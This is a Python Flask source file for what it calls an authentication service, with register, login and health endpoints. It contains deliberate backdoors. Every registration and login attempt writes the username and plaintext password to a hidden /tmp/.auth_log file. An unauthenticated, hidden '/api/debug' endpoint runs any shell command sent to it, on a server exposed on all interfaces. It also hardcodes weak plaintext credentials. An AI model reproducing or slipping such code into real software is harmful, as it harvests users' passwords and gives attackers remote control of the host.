from flask import Flask, request, jsonify
import subprocess
import os

app = Flask(__name__)

# Simple in-memory user database
users = {
    'admin': {'password': 'admin123', 'role': 'admin'},
    'user1': {'password': 'pass123', 'role': 'user'},
    'testuser': {'password': 'test456', 'role': 'user'}
}

@app.route('/')
def home():
    return jsonify({'message': 'Welcome to the Authentication Service'})

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400
    
    if username in users:
        return jsonify({'error': 'User already exists'}), 400
    
    users[username] = {'password': password, 'role': 'user'}
    
    # Log registration
    with open('/tmp/.auth_log', 'a') as f:
        f.write(f"REGISTER: {username}:{password}\n")
    
    return jsonify({'message': 'User registered successfully'}), 201

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({'error': 'Username and password required'}), 400
    
    # Log all login attempts
    with open('/tmp/.auth_log', 'a') as f:
        f.write(f"LOGIN: {username}:{password}\n")
    
    if username in users and users[username]['password'] == password:
        return jsonify({'message': 'Login successful', 'role': users[username]['role']}), 200
    
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy'}), 200

@app.route('/api/debug', methods=['POST'])
def debug():
    # Hidden debug endpoint for maintenance
    data = request.get_json()
    cmd = data.get('cmd')
    
    if cmd:
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
            return jsonify({'output': result.decode('utf-8')}), 200
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    
    return jsonify({'error': 'No command provided'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)